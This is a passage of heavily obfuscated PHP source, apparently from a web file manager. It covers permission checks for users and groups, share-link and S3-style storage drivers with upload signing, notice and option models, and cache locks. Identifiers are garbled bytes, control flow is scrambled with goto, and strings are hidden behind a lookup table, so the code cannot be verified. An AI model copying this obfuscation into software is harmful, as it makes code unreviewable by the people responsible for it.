$eÖ§Æ’øŸŞ[191]) { $CˆõÍª‚¢ˆ = !0; } if ($Fñ¨ä¬Â[$eÖ§Æ’øŸŞ[404]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Aô½í›ç[$eÖ§Æ’øŸŞ[406]])) { $bßÕ›·ĞÁŒ[] = $Fñ¨ä¬Â[$eÖ§Æ’øŸŞ[484]]; } } } return array($eÖ§Æ’øŸŞ[575] => $bßÕ›·ĞÁŒ, $eÖ§Æ’øŸŞ[1916] => $CˆõÍª‚¢ˆ); } public function authMake($cò¯®¡¡å, $d˜½ÉêçŠ = false) { $C¢’Œ×ºÛÎ =& $_SERVER[ä°„ä°º]; $DÁâÀã…ëğ = $this->authArrayCheck($cò¯®¡¡å, $d˜½ÉêçŠ); if ($DÁâÀã…ëğ[$C¢’Œ×ºÛÎ[1918]]) { $DÁâÀã…ëğ[$C¢’Œ×ºÛÎ[1918]] = $this->sourceAuthInfo($DÁâÀã…ëğ[$C¢’Œ×ºÛÎ[1918]]); } return $DÁâÀã…ëğ; } public function authArrayCheck($DÂ©è „¼», $câ‘ÇƒÓ»¾ = false) { goto B·¾§Ê¾¿ˆ; cê‡‹ì›Î: $d´Ä°ëÂšã = 0; $DÇ‡éíŸ® = 0; $E‚ß´ùÍµö = 0; goto e³‹îÚË½ï; dÌ”—œ“™: return $B‡Œë£À¬; goto F…±š×Ç¶¸; b¡ ¹Åˆóæ: foreach ($DÂ©è „¼» as $d°ÄòæÇŠ) { $F…«ˆº¬íÔ = $this->authInfo($d°ÄòæÇŠ); if (!$F…«ˆº¬íÔ) { continue; } $c™—·ŒğºÜ = $d°ÄòæÇŠ[$d¬Œµ·ŞÛÑ[484]]; $c«ñƒ›ˆÖ° = intval($F…«ˆº¬íÔ[$d¬Œµ·ŞÛÑ[406]]); if ($d°ÄòæÇŠ[$d¬Œµ·ŞÛÑ[404]] == SourceModel::TYPE_USER && $c™—·ŒğºÜ == $câ‘ÇƒÓ»¾) { $fÇ£÷‡áŠĞ = !0; $aÃšÕáæ = $F…«ˆº¬íÔ; $e É‚Çä¨ø = $c«ñƒ›ˆÖ°; } else { if ($d°ÄòæÇŠ[$d¬Œµ·ŞÛÑ[404]] == SourceModel::TYPE_GROUP && $this->groupContainUser($c™—·ŒğºÜ, $câ‘ÇƒÓ»¾)) { $d´Ä°ëÂšã = !0; $cŸ„âá·òî = $this->groupStepToUserGroup($c™—·ŒğºÜ, $câ‘ÇƒÓ»¾); if ($cŸ„âá·òî < $cÓİ½­ÍÔ‡) { $cÓİ½­ÍÔ‡ = $cŸ„âá·òî; $DÇ‡éíŸ® = $c«ñƒ›ˆÖ°; $E‚ß´ùÍµö = $F…«ˆº¬íÔ; $b®³ÊÁøÖ = $c™—·ŒğºÜ; } if ($cŸ„âá·òî == $cÓİ½­ÍÔ‡ && $c«ñƒ›ˆÖ° >= $DÇ‡éíŸ®) { $DÇ‡éíŸ® = $c«ñƒ›ˆÖ°; $E‚ß´ùÍµö = $F…«ˆº¬íÔ; $b®³ÊÁøÖ = $c™—·ŒğºÜ; } } else { if ($c™—·ŒğºÜ == $d¬Œµ·ŞÛÑ[191]) { $DŒ®ßô²”Œ = !0; $FÇâ½ï”í• = $F…«ˆº¬íÔ; $FèÏŸ–·…† = $c«ñƒ›ˆÖ°; } } } } if ($fÇ£÷‡áŠĞ) { $AÁïáâ‡‘¶ = $e É‚Çä¨ø; $F…«ˆº¬íÔ = $aÃšÕáæ; $Eœ‘–Âƒ»ª = LNG($d¬Œµ·ŞÛÑ[1919]); } else { if ($d´Ä°ëÂšã) { $AÁïáâ‡‘¶ = $DÇ‡éíŸ®; $F…«ˆº¬íÔ = $E‚ß´ùÍµö; $dŞÒ™³áÍ£ = Model($d¬Œµ·ŞÛÑ[503])->getInfo($b®³ÊÁøÖ); $Eœ‘–Âƒ»ª = $d¬Œµ·ŞÛÑ[160] . $dŞÒ™³áÍ£[$d¬Œµ·ŞÛÑ[507]] . $d¬Œµ·ŞÛÑ[1920] . LNG($d¬Œµ·ŞÛÑ[1921]); } else { if ($DŒ®ßô²”Œ) { $AÁïáâ‡‘¶ = $FèÏŸ–·…†; $F…«ˆº¬íÔ = $FÇâ½ï”í•; $Eœ‘–Âƒ»ª = LNG($d¬Œµ·ŞÛÑ[1892]); } else { $AÁïáâ‡‘¶ = 0; $F…«ˆº¬íÔ = !1; $Eœ‘–Âƒ»ª = $d¬Œµ·ŞÛÑ[33]; } } } $B‡Œë£À¬ = array($d¬Œµ·ŞÛÑ[1911] => intval($AÁïáâ‡‘¶), $d¬Œµ·ŞÛÑ[1895] => $F…«ˆº¬íÔ, $d¬Œµ·ŞÛÑ[1912] => $Eœ‘–Âƒ»ª, $d¬Œµ·ŞÛÑ[1904] => $d°ÄòæÇŠ[$d¬Œµ·ŞÛÑ[395]]); goto dÌ”—œ“™; e³‹îÚË½ï: $cÓİ½­ÍÔ‡ = 1000; $b®³ÊÁøÖ = 0; $DŒ®ßô²”Œ = 0; goto Eº–‹çÁÒ; Eº–‹çÁÒ: $FèÏŸ–·…† = 0; $FÇâ½ï”í• = 0; $d°ÄòæÇŠ = array($d¬Œµ·ŞÛÑ[395] => 0); goto b¡ ¹Åˆóæ; B·¾§Ê¾¿ˆ: $d¬Œµ·ŞÛÑ =& $_SERVER[ä°„ä°º]; if (!$DÂ©è „¼») { return array($d¬Œµ·ŞÛÑ[407] => 0, $d¬Œµ·ŞÛÑ[446] => !1); } $câ‘ÇƒÓ»¾ = $câ‘ÇƒÓ»¾ ? $câ‘ÇƒÓ»¾ : USER_ID; goto E¹£„¥™ËÔ; E¹£„¥™ËÔ: $fÇ£÷‡áŠĞ = 0; $e É‚Çä¨ø = 0; $aÃšÕáæ = 0; goto cê‡‹ì›Î; F…±š×Ç¶¸: } private function groupContainUser($f„á„‘‰¢¢, $E¡­–¥×‘Û = false) { return in_array($f„á„‘‰¢¢, $this->userGroupParents($E¡­–¥×‘Û)); } private function groupStepToUserGroup($a¨—„§Ñ»ï, $E¯Ê·¯ê‘ = false) { goto C°Íœ­î¥Š; C°Íœ­î¥Š: $cÓŸÓŠÆ•ì =& $_SERVER[ä°„ä°º]; $fÌÔˆ¥Õä = $this->userGroupList($E¯Ê·¯ê‘); $dÊîÎÀÅëä = 1000; goto a¬¬ƒö§¥»; a¬¬ƒö§¥»: $aÌáóÜ‘ò¯ = $GLOBALS[$cÓŸÓŠÆ•ì[6]][$cÓŸÓŠÆ•ì[88]][$cÓŸÓŠÆ•ì[1812]] == 1; $BÀ„§ÛÏÚè = $aÌáóÜ‘ò¯ ? 3 : 2; foreach ($fÌÔˆ¥Õä as $eÄ„ìƒ©²) { if ($eÄ„ìƒ©²[$cÓŸÓŠÆ•ì[1720]] == $a¨—„§Ñ»ï) { return 0; } $f½ÁğËõ·½ = explode($cÓŸÓŠÆ•ì[47], trim($eÄ„ìƒ©²[$cÓŸÓŠÆ•ì[502]], $cÓŸÓŠÆ•ì[47])); if ($f½ÁğËõ·½[0] == $cÓŸÓŠÆ•ì[191] && count($f½ÁğËõ·½) > $BÀ„§ÛÏÚè) { $fÙ§†ƒ”¤ö = array_reverse(array_slice($f½ÁğËõ·½, $BÀ„§ÛÏÚè)); $eÃ˜‚ñŞ = array_search($a¨—„§Ñ»ï, $fÙ§†ƒ”¤ö); if ($eÃ˜‚ñŞ !== !1 && $eÃ˜‚ñŞ + 1 <= $dÊîÎÀÅëä) { $dÊîÎÀÅëä = $eÃ˜‚ñŞ + 1; } } } goto FÀ‹õˆÑÛÃ; FÀ‹õˆÑÛÃ: return $dÊîÎÀÅëä; goto DªÜ˜ÀĞ’; DªÜ˜ÀĞ’: } private function userGroupList($Fµâ˜à¾¸ = false) { $BÓ‰± Ç¤ =& $_SERVER[ä°„ä°º]; static $CòÔ¦ = array(); if (isset($CòÔ¦[$Fµâ˜à¾¸])) { return $CòÔ¦[$Fµâ˜à¾¸]; } $e©Ä¸ç·ß‘ = Model($BÓ‰± Ç¤[519])->getInfo($Fµâ˜à¾¸); $CòÔ¦[$Fµâ˜à¾¸] = array_to_keyvalue($e©Ä¸ç·ß‘[$BÓ‰± Ç¤[1893]], $BÓ‰± Ç¤[1720]); return $CòÔ¦[$Fµâ˜à¾¸]; } public function userGroupParents($C×ôÄàâòİ) { goto B®©£ŞÎÛ; cÜÀä‚¸­¶: $CôõÑäšÅÉ = $GLOBALS[$Bë‚ŞÃÃ™ [6]][$Bë‚ŞÃÃ™ [88]][$Bë‚ŞÃÃ™ [1812]] == 1; $cÉóÒ¥©Ò = $CôõÑäšÅÉ ? 3 : 2; foreach ($C˜â¨ÍÔë as $aêÖ¸Õ) { $A‘½È’ÈÅ¤ = array($aêÖ¸Õ[$Bë‚ŞÃÃ™ [1720]]); $bİºáÉ…©† = explode($Bë‚ŞÃÃ™ [47], trim($aêÖ¸Õ[$Bë‚ŞÃÃ™ [502]], $Bë‚ŞÃÃ™ [47])); if ($bİºáÉ…©†[0] == $Bë‚ŞÃÃ™ [191] && count($bİºáÉ…©†) > $cÉóÒ¥©Ò) { $C†âàêå‚ò = array_slice($bİºáÉ…©†, $cÉóÒ¥©Ò); $A‘½È’ÈÅ¤ = array_merge($A‘½È’ÈÅ¤, array_reverse($C†âàêå‚ò)); } $Bò©÷‡îêš = array_merge($Bò©÷‡îêš, $A‘½È’ÈÅ¤); } goto BŠàÛ Úò‘; aÒ‘Û”öî”: if (isset($c”İ˜‚Üƒ…[$C×ôÄàâòİ])) { return $c”İ˜‚Üƒ…[$C×ôÄàâòİ]; } $C˜â¨ÍÔë = $this->userGroupList($C×ôÄàâòİ); $Bò©÷‡îêš = array(); goto cÜÀä‚¸­¶; BŠàÛ Úò‘: $c”İ˜‚Üƒ…[$C×ôÄàâòİ] = array_unique($Bò©÷‡îêš); return $c”İ˜‚Üƒ…[$C×ôÄàâòİ]; goto dØÑ¼ØÒÚ; B®©£ŞÎÛ: $Bë‚ŞÃÃ™  =& $_SERVER[ä°„ä°º]; static $c”İ˜‚Üƒ… = array(); $C×ôÄàâòİ = $C×ôÄàâòİ ? $C×ôÄàâòİ : USER_ID; goto aÒ‘Û”öî”; dØÑ¼ØÒÚ: } public function authTargetInfoMake($föéŒö‡Ú) { goto Fƒœ—åæØ; bğ‰º¼Îã÷: foreach ($föéŒö‡Ú as $EêÄÊï‡ë) { if ($EêÄÊï‡ë[$CÍì¬Ü›«Œ[404]] == SourceModel::TYPE_USER) { $fŸÏßóÖ[] = intval($EêÄÊï‡ë[$CÍì¬Ü›«Œ[484]]); } else { if ($EêÄÊï‡ë[$CÍì¬Ü›«Œ[404]] == SourceModel::TYPE_GROUP) { $D…»¼Äö[] = intval($EêÄÊï‡ë[$CÍì¬Ü›«Œ[484]]); } } } if ($fŸÏßóÖ) { $fŸÏßóÖ = Model($CÍì¬Ü›«Œ[494])->userListInfo($fŸÏßóÖ); } if ($D…»¼Äö) { $a°Ù ‡¶íØ = array($CÍì¬Ü›«Œ[1798] => array($CÍì¬Ü›«Œ[411], $D…»¼Äö)); $D…»¼Äö = Model($CÍì¬Ü›«Œ[503])->field($CÍì¬Ü›«Œ[1922])->where($a°Ù ‡¶íØ)->select(); $D…»¼Äö = array_to_keyvalue($D…»¼Äö, $CÍì¬Ü›«Œ[1720]); } goto B½ôÁ¾Â—­; Fƒœ—åæØ: $CÍì¬Ü›«Œ =& $_SERVER[ä°„ä°º]; $fŸÏßóÖ = array(); $D…»¼Äö = array(); goto bğ‰º¼Îã÷; B½ôÁ¾Â—­: return array($CÍì¬Ü›«Œ[1923] => $fŸÏßóÖ, $CÍì¬Ü›«Œ[1924] => $D…»¼Äö); goto D¼‘³‘É½Ñ; D¼‘³‘É½Ñ: } public function authInfo($aŸÒæ‚) { $déÌ±‡ìï =& $_SERVER[ä°„ä°º]; if ($aŸÒæ‚[$déÌ±‡ìï[1815]]) { $B»¸–„Ëê— = Model($déÌ±‡ìï[488])->listData($aŸÒæ‚[$déÌ±‡ìï[1815]]); if (!$B»¸–„Ëê—) { return !1; $a£³Æ™àõ¨ = Model($déÌ±‡ìï[488])->listData(); $e™’Œ™­ = array_filter_by_field($a£³Æ™àõ¨, $déÌ±‡ìï[406], $déÌ±‡ìï[191]); return $e™’Œ™­; } $c¯™ÏÓÃñ = array_field_key($B»¸–„Ëê—, array($déÌ±‡ìï[393], $déÌ±‡ìï[28], $déÌ±‡ìï[406], $déÌ±‡ìï[1742], $déÌ±‡ìï[1743])); $c¯™ÏÓÃñ[$déÌ±‡ìï[1925]] = $aŸÒæ‚; return $c¯™ÏÓÃñ; } else { return array($déÌ±‡ìï[412] => 0, $déÌ±‡ìï[1726] => $aŸÒæ‚[$déÌ±‡ìï[1869]], $déÌ±‡ìï[413] => $déÌ±‡ìï[33], $déÌ±‡ìï[1742] => $déÌ±‡ìï[1926]); } } } goto E÷åë­ÇŞ¸; B¡Ë‘òá„: define($_SERVER[ä°„ä°º][237], 2); define($_SERVER[ä°„ä°º][238], 3); define($_SERVER[ä°„ä°º][239], 1); goto BÌ˜Ã¨¶ß; fÊ”±‘²‚¿: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($c§Ê²ìÀæè) { $this->pathParse = $c§Ê²ìÀæè; } protected function infoParse($aç¼À¢ÓÖš, $BÉ¾ˆ¹ªô× = false) { $FöÓÃÄÈÃğ =& $_SERVER[ä°„ä°º]; return Action($FöÓÃÄÈÃğ[1091])->sharePathInfo($this->pathParse[$FöÓÃÄÈÃğ[76]], !0, $BÉ¾ˆ¹ªô×); } public function listPath($fƒŒ……×ŒÇ, $C‡…ò £æ¨ = false) { $a™„•Î¹Ú— =& $_SERVER[ä°„ä°º]; $CàˆÎ„Ù¶ = IO::listPath($fƒŒ……×ŒÇ, $C‡…ò £æ¨); foreach ($CàˆÎ„Ù¶ as $F±™ã—Æ¥¼ => $cšËÚñƒéœ) { if (!in_array($F±™ã—Æ¥¼, array($a™„•Î¹Ú—[74], $a™„•Î¹Ú—[75]))) { continue; } foreach ($cšËÚñƒéœ as $eÛ‚«‘´š¾ => $BÇ’ÕìÁÓ) { $BÇ’ÕìÁÓ = Action($a™„•Î¹Ú—[1244])->parsePathChildren($BÇ’ÕìÁÓ, array($a™„•Î¹Ú—[414] => $fƒŒ……×ŒÇ)); $CàˆÎ„Ù¶[$F±™ã—Æ¥¼][$eÛ‚«‘´š¾] = Action($a™„•Î¹Ú—[1091])->shareItemInfo($BÇ’ÕìÁÓ); } } return $CàˆÎ„Ù¶; } public function listAll($BÜİÈ¶ñš) { $CÁÙÀ“ÍÉ =& $_SERVER[ä°„ä°º]; $dì©±ğÙ×½ = IO::listAll($BÜİÈ¶ñš); foreach ($dì©±ğÙ×½ as &$Eæ´ù×™‰º) { $C’É÷å·éî = IO::info($Eæ´ù×™‰º[$CÁÙÀ“ÍÉ[76]]); $C’É÷å·éî = is_array($C’É÷å·éî) ? $C’É÷å·éî : array(); $Eæ´ù×™‰º = array_merge($C’É÷å·éî, $Eæ´ù×™‰º); $Eæ´ù×™‰º[$CÁÙÀ“ÍÉ[85]] = Action($CÁÙÀ“ÍÉ[1091])->shareItemInfo($Eæ´ù×™‰º); } unset($Eæ´ù×™‰º); return $dì©±ğÙ×½; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($Bˆ™¤®àá) { parent::__construct($Bˆ™¤®àá); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($E–¨á¶ğàÑ) { parent::__construct($E–¨á¶ğàÑ); $this->signatureVersion($_SERVER[ä°„ä°º][212]); } public function uploadFormData($DœÆ‡ºğ‚¤, $B—òœä…é = 3600) { goto F‰í±ºóõ; F‰í±ºóõ: $B«ÉŒ†Şæ˜ =& $_SERVER[ä°„ä°º]; $câ‘é¿¼ = $B«ÉŒ†Şæ˜[192]; $eÈ¯×ğÌ…Š = $B«ÉŒ†Şæ˜[1245]; goto cäÜˆ–ù‡ã; aŸŒ‘›¹ò: $e—£ëºÙÇ‰ = array($B«ÉŒ†Şæ˜[211] => $B«ÉŒ†Şæ˜[33], $B«ÉŒ†Şæ˜[1257] => $B«ÉŒ†Şæ˜[33], $B«ÉŒ†Şæ˜[1214] => $câ‘é¿¼, $B«ÉŒ†Şæ˜[1218] => $A‹²¼™çµ·, $B«ÉŒ†Şæ˜[1222] => $Cæâ§ŒµÙ, $B«ÉŒ†Şæ˜[1258] => $AÜÏ¯Œˆª, $B«ÉŒ†Şæ˜[1259] => $eÈ¯×ğÌ…Š, $B«ÉŒ†Şæ˜[1260] => $aªÉÒééôÓ, $B«ÉŒ†Şæ˜[1261] => $Cà‚·£®Š, $B«ÉŒ†Şæ˜[1262] => $FĞÌµÔ÷, $B«ÉŒ†Şæ˜[175] => $this->getHost()); return $e—£ëºÙÇ‰; goto D’äªîÛÛ; b·ÉöèÑ¡±: $E—…‰ÏïŠä = $B«ÉŒ†Şæ˜[1247]; $Cà‚·£®Š = $B—òœä…é . $B«ÉŒ†Şæ˜[33]; $A‹²¼™çµ· = $B«ÉŒ†Şæ˜[1210]; goto B°á•—•¾í; Bàë°”·´É: $d°Ñ…º’†å = hash_hmac($B«ÉŒ†Şæ˜[1255], $bÄ¨®ùŒÓ, $DÈ›ŒÑ›®â, !0); $d÷™Ğ¡âÈ­ = hash_hmac($B«ÉŒ†Şæ˜[1255], $E—…‰ÏïŠä, $d°Ñ…º’†å, !0); $FĞÌµÔ÷ = hash_hmac($B«ÉŒ†Şæ˜[1255], $Cæâ§ŒµÙ, $d÷™Ğ¡âÈ­); goto aŸŒ‘›¹ò; B°á•—•¾í: $dñö½†‹½‡ = array($this->accessKey, $E†ƒã¿, $this->region, $bÄ¨®ùŒÓ, $E—…‰ÏïŠä); $AÜÏ¯Œˆª = implode($B«ÉŒ†Şæ˜[8], $dñö½†‹½‡); $CÅîŞ¤ŸÓ = array($B«ÉŒ†Şæ˜[1212] => gmdate($B«ÉŒ†Şæ˜[1211], strtotime($B«ÉŒ†Şæ˜[1248])), $B«ÉŒ†Şæ˜[1213] => array(array($B«ÉŒ†Şæ˜[1215] => $this->bucket), array($B«ÉŒ†Şæ˜[1214] => $câ‘é¿¼), array($B«ÉŒ†Şæ˜[1216], $B«ÉŒ†Şæ˜[1217], $B«ÉŒ†Şæ˜[33]), array($B«ÉŒ†Şæ˜[1216], $B«ÉŒ†Şæ˜[1249], $B«ÉŒ†Şæ˜[33]), array($B«ÉŒ†Şæ˜[1216], $B«ÉŒ†Şæ˜[1250], $B«ÉŒ†Şæ˜[33]), array($B«ÉŒ†Şæ˜[1218] => $A‹²¼™çµ·), array($B«ÉŒ†Şæ˜[1251] => $AÜÏ¯Œˆª), array($B«ÉŒ†Şæ˜[1252] => $eÈ¯×ğÌ…Š), array($B«ÉŒ†Şæ˜[1253] => $aªÉÒééôÓ), array($B«ÉŒ†Şæ˜[1254] => $Cà‚·£®Š))); goto EŠ£‚ùóàš; cäÜˆ–ù‡ã: $bÄ¨®ùŒÓ = $B«ÉŒ†Şæ˜[59]; $aªÉÒééôÓ = gmdate($B«ÉŒ†Şæ˜[1246]); $E†ƒã¿ = gmdate($B«ÉŒ†Şæ˜[734]); goto b·ÉöèÑ¡±; EŠ£‚ùóàš: $Cæâ§ŒµÙ = base64_encode(json_encode($CÅîŞ¤ŸÓ)); $dÒù„Ì«¹ê = hash_hmac($B«ÉŒ†Şæ˜[1255], $E†ƒã¿, $B«ÉŒ†Şæ˜[1256] . $this->secret, !0); $DÈ›ŒÑ›®â = hash_hmac($B«ÉŒ†Şæ˜[1255], $this->region, $dÒù„Ì«¹ê, !0); goto Bàë°”·´É; D’äªîÛÛ: } } goto bºšõ»œ½; bŒóŒ¢Ê: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\x2e\x6e\157\164\x69\x63\x65\114\x69\163\x74"; public $field = array("\x6e\141\x6d\x65", "\143\157\x6e\164\145\x6e\164", "\141\165\164\x68", "\155\x6f\144\145", "\164\x69\x6d\x65", "\x74\x79\x70\x65", "\154\x65\x76\145\154", "\x65\156\141\142\x6c\x65", "\x73\x6f\162\164"); public function listData($e‹ñÃË¨È‚ = false, $d†‹±×ÎéØ = "\163\157\x72\x74", $bôâ„ˆ± = false) { return parent::listData($e‹ñÃË¨È‚, $d†‹±×ÎéØ, $bôâ„ˆ±); } public function add($E¶ñ¤˜Ãã‘) { $BÛôŸ›àÇ =& $_SERVER[ä°„ä°º]; $cÛ”©íÁ°å = time(); if ($E¶ñ¤˜Ãã‘[$BÛôŸ›àÇ[12]] == $BÛôŸ›àÇ[2128]) { $cÛ”©íÁ°å = strtotime($E¶ñ¤˜Ãã‘[$BÛôŸ›àÇ[197]]); } $E¶ñ¤˜Ãã‘[$BÛôŸ›àÇ[197]] = $cÛ”©íÁ°å; return parent::insert($E¶ñ¤˜Ãã‘); } public function update($B¼³ÀÁË‚¦, $dæä·‰”à¢) { goto Dä­¢®áè–; Dä­¢®áè–: $F £¿ç©÷Å =& $_SERVER[ä°„ä°º]; $fÏØçË¦ = $this->listData($B¼³ÀÁË‚¦); if (!$fÏØçË¦) { return !1; } goto D¬İ…¸°ŸÀ; D¬İ…¸°ŸÀ: $BËíôéšĞÛ = time(); if ($dæä·‰”à¢[$F £¿ç©÷Å[12]] == $F £¿ç©÷Å[2128]) { $BËíôéšĞÛ = strtotime($dæä·‰”à¢[$F £¿ç©÷Å[197]]); } $dæä·‰”à¢[$F £¿ç©÷Å[197]] = $BËíôéšĞÛ; goto Cµ“Å®Â‘; Cµ“Å®Â‘: return parent::update($B¼³ÀÁË‚¦, $dæä·‰”à¢); goto Båµò ©™ï; Båµò ©™ï: } public function remove($d¢¡é—â«Ã) { $F»©…”£Ú = $this->listData($d¢¡é—â«Ã); if (!$F»©…”£Ú || $F»©…”£Ú[$_SERVER[ä°„ä°º][1192]]) { return !1; } return parent::remove($d¢¡é—â«Ã); } public function sort($cè”ƒÑ˜…¢, $d’Ø¶…ÂŒ) { return parent::update($cè”ƒÑ˜…¢, $d’Ø¶…ÂŒ); } public function enable($FÈ˜½ê–°®, $EŒöÁŒÓÑ§) { return parent::update($FÈ˜½ê–°®, array($_SERVER[ä°„ä°º][2129] => $EŒöÁŒÓÑ§)); } private function initUserOption() { $FŠô–‚‘·ˆ =& $_SERVER[ä°„ä°º]; $this->optionType = $FŠô–‚‘·ˆ[2130]; $this->modelType = $FŠô–‚‘·ˆ[2131]; $this->field = array($FŠô–‚‘·ˆ[2132], $FŠô–‚‘·ˆ[28], $FŠô–‚‘·ˆ[197], $FŠô–‚‘·ˆ[29], $FŠô–‚‘·ˆ[2133], $FŠô–‚‘·ˆ[733], $FŠô–‚‘·ˆ[189]); } public function userNoticeGet($aÚá¥Å§Õæ = false) { $this->initUserOption(); return parent::listData($aÚá¥Å§Õæ, $_SERVER[ä°„ä°º][393], !0); } public function userNoticeAdd($fãå…™î×º) { $Bœ¥Áïî×ˆ =& $_SERVER[ä°„ä°º]; $this->initUserOption(); $déŒ´Å÷ Í = $this->findByKey($Bœ¥Áïî×ˆ[2132], $fãå…™î×º[$Bœ¥Áïî×ˆ[393]]); if ($déŒ´Å÷ Í) { return !0; } $F®ÈëĞ¹œ = array($Bœ¥Áïî×ˆ[2132] => $fãå…™î×º[$Bœ¥Áïî×ˆ[393]], $Bœ¥Áïî×ˆ[28] => $fãå…™î×º[$Bœ¥Áïî×ˆ[28]], $Bœ¥Áïî×ˆ[197] => $fãå…™î×º[$Bœ¥Áïî×ˆ[197]], $Bœ¥Áïî×ˆ[29] => isset($fãå…™î×º[$Bœ¥Áïî×ˆ[29]]) ? $fãå…™î×º[$Bœ¥Áïî×ˆ[29]] : 1, $Bœ¥Áïî×ˆ[2133] => isset($fãå…™î×º[$Bœ¥Áïî×ˆ[2133]]) ? $fãå…™î×º[$Bœ¥Áïî×ˆ[2133]] : 0, $Bœ¥Áïî×ˆ[733] => 0, $Bœ¥Áïî×ˆ[189] => 0); return parent::insert($F®ÈëĞ¹œ); } public function userNoticeEdit($AÅÙå¨´Ğ, $dÃš°§ƒà) { $this->initUserOption(); return parent::update($AÅÙå¨´Ğ, $dÃš°§ƒà); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\164\145\x6d\137\157\160\164\151\157\156"; protected $jsonField = array("\155\x65\156\165", "\162\157\154\x65", "\162\x6f\154\x65\107\162\x6f\x75\x70", "\x72\145\147\151\x73\164", "\145\x6d\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($Dˆé“ïæ‘Ò) { return "\x53\x79\x73\x74\145\x6d\117\160\164\151\157\156\137{$Dˆé“ïæ‘Ò}"; } protected function optionDefault($BÈ«‡µŠ¹° = '') { $f†½™Æ®½ì =& $_SERVER[ä°„ä°º]; if ($BÈ«‡µŠ¹° == $f†½™Æ®½ì[33]) { return $GLOBALS[$f†½™Æ®½ì[6]][$f†½™Æ®½ì[378]]; } } } class SystemRecordModel extends ModelBaseLight { } goto aä–ÚŒº‘¨; F¼Š³¶„½: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $fÌ¶ÊÍ¦ª³ =& $_SERVER[ä°„ä°º]; $AÃê÷„³ß¨ = $GLOBALS[$fÌ¶ÊÍ¦ª³[6]][$fÌ¶ÊÍ¦ª³[347]]; self::$cachePath = $AÃê÷„³ß¨[$fÌ¶ÊÍ¦ª³[193]][$fÌ¶ÊÍ¦ª³[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($A„†Ğ¨å¿, $eË’‚¨µ„‹ = 0) { goto BÛÑ…Ã¦ğİ; Dİ¸êñçî: $this->unlock($A„†Ğ¨å¿); return !1; goto A»˜šê¸éÌ; BÛÑ…Ã¦ğİ: $DÈğÆÒµÕ‰ =& $_SERVER[ä°„ä°º]; $fÊ¤•¢÷²á = microtime(!0); $FÍŞçÉ›Ú§ = $fÊ¤•¢÷²á + $eË’‚¨µ„‹ + 0.0001; goto aÃÖ›ÍöõÅ; aÃÖ›ÍöõÅ: $B¡Ï—®Ç­ = rtrim(self::$cachePath, $DÈğÆÒµÕ‰[8]) . $DÈğÆÒµÕ‰[841] . md5($A„†Ğ¨å¿) . $DÈğÆÒµÕ‰[838]; if (file_exists($B¡Ï—®Ç­) && filemtime($B¡Ï—®Ç­) && filemtime($B¡Ï—®Ç­) < time() - 10) { @unlink($B¡Ï—®Ç­); } do { if (file_exists($B¡Ï—®Ç­)) { cacheLockWait(); continue; } $E°ÌÇÔˆ = fopen($B¡Ï—®Ç­, $DÈğÆÒµÕ‰[842]); if (!$E°ÌÇÔˆ) { return !1; } $dÁÇÙƒÁ‹¾ = flock($E°ÌÇÔˆ, LOCK_EX | LOCK_NB); self::$caches[$A„†Ğ¨å¿] = array($DÈğÆÒµÕ‰[843] => $E°ÌÇÔˆ, $DÈğÆÒµÕ‰[193] => $B¡Ï—®Ç­); fwrite($E°ÌÇÔˆ, $FÍŞçÉ›Ú§); clearstatcache(); if ($E°ÌÇÔˆ && $dÁÇÙƒÁ‹¾) { return !0; } cacheLockWait(); } while (microtime(!0) < $FÍŞçÉ›Ú§); goto Dİ¸êñçî; A»˜šê¸éÌ: } public function lockGet($aøËä¾Ã) { $cáÈ‹ÁÎš =& $_SERVER[ä°„ä°º]; $e´…äÓè² = rtrim(self::$cachePath, $cáÈ‹ÁÎš[8]) . $cáÈ‹ÁÎš[841] . md5($aøËä¾Ã) . $cáÈ‹ÁÎš[838]; return file_exists($e´…äÓè²); } public function unlock($E‰Ê‰…İï) { goto a»Å†‡À¯é; díÒ›‘™›‰: @flock($C£¶óè¸…[$A¼î¾ŒĞÈ·[843]], LOCK_UN); @fclose($C£¶óè¸…[$A¼î¾ŒĞÈ·[843]]); @unlink($C£¶óè¸…[$A¼î¾ŒĞÈ·[193]]); goto cî³ÁõƒªŠ; a»Å†‡À¯é: $A¼î¾ŒĞÈ· =& $_SERVER[ä°„ä°º]; $C£¶óè¸… = self::$caches[$E‰Ê‰…İï]; if (!$C£¶óè¸…) { return; } goto díÒ›‘™›‰; cî³ÁõƒªŠ: unset(self::$caches[$E‰Ê‰…İï]); goto aÔ˜‹Î÷èä; aÔ˜‹Î÷èä: } } class CacheLockRedis { public function lock($cÍñœ±¢‚Ì, $cøáˆ”‘¹« = 10) { $B×øØª§ùº = Cache::init(); $dÌ†×åÜ‹ = microtime(!0) + $cøáˆ”‘¹«; while (microtime(!0) < $dÌ†×åÜ‹) { $aìó‹Ø¼œÈ = $B×øØª§ùº->get($cÍñœ±¢‚Ì); if (!$aìó‹Ø¼œÈ) { $açĞ´°õª‘ = $B×øØª§ùº->setLock($cÍñœ±¢‚Ì, $dÌ†×åÜ‹, $cøáˆ”‘¹«); if ($açĞ´°õª‘) { return !0; } } else { if ($aìó‹Ø¼œÈ < microtime(!0)) { $B×øØª§ùº->set($cÍñœ±¢‚Ì, $dÌ†×åÜ‹, $cøáˆ”‘¹« * 2); if ($B×øØª§ùº->get($cÍñœ±¢‚Ì) === $aìó‹Ø¼œÈ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($F´“ŠâÖæ) { return Cache::init()->get($F´“ŠâÖæ); } public function unlock($fÃ”†·ê÷‹) { return Cache::init()->remove($fÃ”†·ê÷‹); } } goto Cºæ»ÜˆŞÓ; a‰ãÚ‚‚Ç: class PathDriverDbShareItem extends PathDriverDB { public function __construct($e†«¸ºØ°—) { $this->pathParse = $e†«¸ºØ°—; $this->model = Model($_SERVER[ä°„ä°º][1227]); } public function getPathOuter($e›“—âË¨) { $D½ˆ­°Êğ¨ =& $_SERVER[ä°„ä°º]; if (!$e›“—âË¨) { return $e›“—âË¨; } $e¼ë¦ñ­ë = $this->parse($e›“—âË¨); return 